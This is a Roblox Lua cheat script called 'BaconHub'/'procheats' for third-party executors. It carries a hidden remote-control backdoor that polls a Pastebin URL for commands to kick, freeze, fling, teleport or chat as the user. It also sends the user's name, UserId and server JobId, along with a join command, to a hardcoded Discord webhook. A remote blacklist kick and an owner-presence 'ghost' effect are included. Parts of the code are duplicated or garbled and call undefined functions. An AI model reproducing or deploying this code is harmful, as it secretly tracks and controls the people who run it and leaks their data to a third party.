-- ‚úÖ Command Logger
function logCommand(cmd)
	local logData = {
		username = "üì° BaconHub Command Logger",
		embeds = {{
			title = "üì• Command Executed on User",
			color = 0x3498db,
			description = table.concat({
				"üë§ **User:** "..player.Name.." (`"..player.UserId.."`)",
				"üéØ **Target:** "..(cmd.target or "unknown"),
				"üõ†Ô∏è **Action:** `" .. (cmd.action or "none") .. "`",
				"üìù **Message:** "..(cmd.text or "N/A"),
				"üïí **Time:** "..os.date("%Y-%m-%d %H:%M:%S"),
				"üåê **Game:** ["..gameName.."]("..gameLink..")"
			}, "\n"),
			footer = { text = "BaconHub Remote Command Logger" }
		}}
	}
	pcall(function()
		if request then
			request({
				Url = commandWebhook,
				Method = "POST",
				Headers = {["Content-Type"] = "application/json"},
				Body = HttpService:JSONEncode(logData)
			})
		end
	end)
end

-- ‚úÖ Notification popup
function showPopup(txt)
	local gui = Instance.new("ScreenGui", PlayerGui)
	local label = Instance.new("TextLabel", gui)
	label.Size = UDim2.new(0, 400, 0, 50)
	label.Position = UDim2.new(0.5, -200, 0, 60)
	label.BackgroundColor3 = Color3.fromRGB(40,40,40)
	label.TextColor3 = Color3.new(1,1,1)
	label.Font = Enum.Font.GothamBold
	label.TextScaled = true
	label.Text = txt
	Debris:AddItem(gui, 4)
end

-- ‚úÖ Command Handlers
local PastebinURL = "https://pastebin.com/raw/SCbhHcVw"
local frozen = false
local processed = {}

RunService.Stepped:Connect(function()
	if frozen and player.Character then
		local hum = player.Character:FindFirstChildOfClass("Humanoid")
		if hum then hum.WalkSpeed = 0 hum.JumpPower = 0 end
	end
end)

local handlers = {
	kick = function(cmd) logCommand(cmd) player:Kick(cmd.text or "You were kicked.") end,
	freeze = function(cmd) logCommand(cmd) frozen = true showPopup("‚ùÑÔ∏è You were frozen") end,
	unfreeze = function(cmd) logCommand(cmd) frozen = false showPopup("üî• Unfrozen") end,
	message = function(cmd) logCommand(cmd) showPopup("üì® "..(cmd.text or "")) end,
	global = function(cmd) logCommand(cmd) game.StarterGui:SetCore("ChatMakeSystemMessage",{Text="üåê GLOBAL: "..(cmd.text or ""),Color=Color3.new(1,1,0),Font=Enum.Font.SourceSansBold,FontSize=Enum.FontSize.Size24}) end,
	say = function(cmd) logCommand(cmd) local rep = game:GetService("ReplicatedStorage") local chat = rep:FindFirstChild("DefaultChatSystemChatEvents") if chat then chat.SayMessageRequest:FireServer(cmd.text or "Hello!", "All") end end,
	teleport = function(cmd) logCommand(cmd) if cmd.placeId and cmd.jobId then TeleportService:TeleportToPlaceInstance(tonumber(cmd.placeId), tostring(cmd.jobId), player) end end,
	custom = function(cmd) logCommand(cmd) if cmd.subaction == "fling" then local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart") if hrp then hrp.Velocity = Vector3.new(0, 150, 0) showPopup("üí• Flung") end end end
}

function runCommand(cmd)
	if type(cmd) ~= "table" then return end
	local id = tostring(cmd.id or HttpService:JSONEncode(cmd))
	if processed[id] then return end
	if not handlers[cmd.action] then return end
	if (cmd.target or ""):lower() == player.Name:lower() or cmd.target == tostring(player.UserId) or cmd.target == "all" then
		processed[id] = true
		handlers[cmd.action](cmd)
	end
end

function fetchCommands()
	local ok, res = pcall(function() return game:HttpGet(PastebinURL) end)
	if ok then
		local success, data = pcall(function() return HttpService:JSONDecode(res) end)
		if success and typeof(data) == "table" then
			for _,cmd in ipairs(data) do runCommand(cmd) end
		end
	end
end

task.spawn(function()
	while true do
		fetchCommands()
		task.wait(10)
	end
end)

logCommand({action = "join", target = player.Name, text = "üîî procheats Remote Loaded"})
showPopup("‚úÖ procheats Loaded")

logCommand({action = "join", target = player.Name, text = "üîî procheats Remote Loaded"})
showPopup("‚úÖ procheatsLoaded")

local blacklistURL = "https://pastebin.com/raw/rhdbw8ZY"

-- ‚úÖ KRNL-Compatible Webhook with Username + Teleport Command

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local LocalPlayer = Players.LocalPlayer
local username = LocalPlayer.Name

local placeId = tostring(game.PlaceId)
local jobId = tostring(game.JobId)

local webhook = "https://discord.com/api/webhooks/1397575581570437221/YR78v0TagfOEez0JcuxDcfxbNVrtuWVREwo9hnjvYr-P4UrAvpAA5guxMZdAdJYiLTa4"

local teleportCmd = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. placeId .. ', "' .. jobId .. '")'

local payload = {
    content = "**üì° BaconHub user joined!**\n" ..
              "üë§ **Username:** `" .. username .. "`\n" ..
              "üìç **PlaceId:** `" .. placeId .. "`\n" ..
              "üß© **JobId:** `" .. jobId .. "`\n\n" ..
              "üìã **Join them:**\n```lua\n" .. teleportCmd .. "\n```"
}

local req = http_request or request or syn.request
if not req then
    warn("‚ùå HTTP request function not available in this executor.")
    return
end

local success, response = pcall(function()
    return req({
        Url = webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(payload)
    })
end)

if success then
    print("[‚úÖ] Webhook sent with username and join code!")
else
    warn("[‚ùå] Failed to send webhook:", response)
end


local function createTextLabel(parent, props)
    local label = Instance.new("TextLabel", parent)
    for prop, val in pairs(props) do
        label[prop] = val
    end
    return label
end

local function showBlacklistGuiAndKick()
    local gui = Instance.new("ScreenGui", PlayerGui)
    gui.Name = "BlacklistWarning"

    createTextLabel(gui, {
        Size = UDim2.new(0.6, 0, 0.12, 0),
        Position = UDim2.new(0.2, 0, 0.4, 0),
        Text = "‚ùå You have broken the rule.\nYou have been blacklisted.",
        TextColor3 = Color3.fromRGB(255, 0, 0),
        Font = Enum.Font.GothamBold,
        TextScaled = true,
        TextWrapped = true,
        BackgroundColor3 = Color3.fromRGB(25, 25, 25),
        BackgroundTransparency = 0.1,
        BorderSizePixel = 0,
    })

    logToWebhook("üö´ **Blocked User:** `" .. Player.Name .. "` (`" .. Player.UserId .. "`)\n‚õî Reason: Blacklisted from Pastebin.")
    task.wait(5)
    Player:Kick("‚ùå You are blacklisted from BaconHub.")
end

local function checkBlacklist()
    local success, raw = pcall(function()
        return game:HttpGet(blacklistURL)
    end)
    if not success or typeof(raw) ~= "string" then return false end

    local ids = string.split(raw, "\n")
    for _, id in ipairs(ids) do
        if tostring(Player.UserId) == id then
            return true
        end
    end
    return false
end

-- Main blacklist check
if checkBlacklist() then
    showBlacklistGuiAndKick()
end

-- Command Handlers
local function handleKick(reason)
    logToWebhook("üö´ **" .. Player.Name .. "** was kicked.\nüìù Reason: `" .. (reason or "No reason") .. "`")
    Player:Kick(reason or "You were kicked.")
end

local function handleFreeze()
    local char = Player.Character or Player.CharacterAdded:Wait()
    local root = char and Ar.CharacterAdded:Wait()
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if root then
        root.Anchored = true
        logToWebhook("‚ùÑÔ∏è **" .. Player.Name .. "** was frozen.")
    end
end

local function handleUnfreeze()
    local char = Player.Character or Player.CharacterAdded:Wait()
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if root then
        root.Anchored = false
        logToWebhook("üî• **" .. Player.Name .. "** was unfrozen.")
    end
end

local function showMessageToUser(text)
    local gui = Instance.new("ScreenGui", PlayerGui)
    gui.Name = "BaconHubMessage"

    local label = createTextLabel(gui, {
        Size = UDim2.new(0.6, 0, 0.1, 0),
        Position = UDim2.new(0.2, 0, 0.85, 0),
        Text = text or "üì¨ BaconHub message.",
        TextColor3 = Color3.new(1, 1, 1),
        Font = Enum.Font.GothamBold,
        TextScaled = true,
        BackgroundColor3 = Color3.fromRGB(30, 30, 30),
        BackgroundTransparency = 0.2,
        BorderSizePixel = 0,
    })

    task.delay(5, function() gui:Destroy() end)
    logToWebhook("üí¨ **" .. Player.Name .. "** was shown a message: `" .. text .. "`")
end

-- Join log
logToWebhook("üîî **" .. Player.Name .. "** loaded procheats Remote")

-- üëë BaconHub Owner Detection + Ghost üëª
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local Debris = game:GetService("Debris")
local InsertService = game:GetService("InsertService")
local SoundService = game:GetService("SoundService")

-- üëª Ghost spawner
local function spawnGhost()
	local ghost = Instance.new("Model", workspace)
	ghost.Name = "üëª BaconGhost"

	-- Dummy Humanoid
	local humanoid = Instance.new("Humanoid")
	humanoid.Name = "Humanoid"
	humanoid.Parent = ghost
	humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None

	-- Load appearance of Bacon_hack7698 (UserId 8636199320)
	local success, result = pcall(function()
		return Players:GetHumanoidDescriptionFromUserId(8636199320)
	end)
	if success then
		local ghostDummy = Instance.new("Model")
		ghostDummy.Name = "GhostDummy"
		local hrp = Instance.new("Part", ghostDummy)
		hrp.Name = "HumanoidRootPart"
		hrp.Size = Vector3.new(2,2,1)
		hrp.Anchored = true
		hrp.Transparency = 1
		hrp.CanCollide = false

		local hum = Instance.new("Humanoid", ghostDummy)
		hum:ApplyDescription(result)
		hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
		ghostDummy.Parent = workspace

		-- Position ghost in front of player
		local char = Player.Character or Player.CharacterAdded:Wait()
		local root = char:WaitForChild("HumanoidRootPart")
		local pos = root.Position + (root.CFrame.LookVector * 20)
		hrp.CFrame = CFrame.new(pos)

		-- Make parts ghostly
		for _,desc in ipairs(ghostDummy:GetDescendants()) do
			if desc:IsA("BasePart") or desc:IsA("Decal") then
				desc.Transparency = 1
			end
		end

		-- Fade in
		task.spawn(function()
			for i = 1, 20 do
				for _,desc in ipairs(ghostDummy:GetDescendants()) do
					if desc:IsA("BasePart") or desc:IsA("Decal") then
						desc.Transparency = math.clamp(1 - i * 0.05, 0.5, 1)
					end
				end
				task.wait(0.1)
			end
		end)

		-- Add spooky whisper sound
		local whisper = Instance.new("Sound", hrp)
		whisper.SoundId = "rbxassetid://9118823102" -- creepy whisper sound
		whisper.Volume = 1
		whisper:Play()

		-- Remove after 10 sec
		Debris:AddItem(ghostDummy, 10)
	end
end

-- üëÅÔ∏è Alert UI
local function showOwnerAlert()
	local gui = Instance.new("ScreenGui", Player:WaitForChild("PlayerGui"))
	gui.Name = "BaconHubOwnerJoin"

	local msg = Instance.new("TextLabel", gui)
	msg.Size = UDim2.new(0.6, 0, 0.08, 0)
	msg.Position = UDim2.new(0.2, 0, 0.88, 0)
	msg.Text = "üö® Bacon_hack7698 (BaconHub Owner) has joined your server!"
	msg.TextColor3 = Color3.fromRGB(255, 0, 0)
	msg.Font = Enum.Font.GothamBold
	msg.TextScaled = true
	msg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	msg.BackgroundTransparency = 0.2
	msg.BorderSizePixel = 0

	wait(6)
	gui:Destroy()
end

-- üîé Detect if Bacon_hack7698 is here
if Player.Name ~= "Bacon_hack7698" then
	for _,plr in ipairs(Players:GetPlayers()) do
		if plr.Name == "Bacon_hack7698" then
			showOwnerAlert()
			spawnGhost()
		end
	end

	Players.PlayerAdded:Connect(function(plr)
		if plr.Name == "Bacon_hack7698" then
			showOwnerAlert()
			spawnGhost()
		end
	end)
end
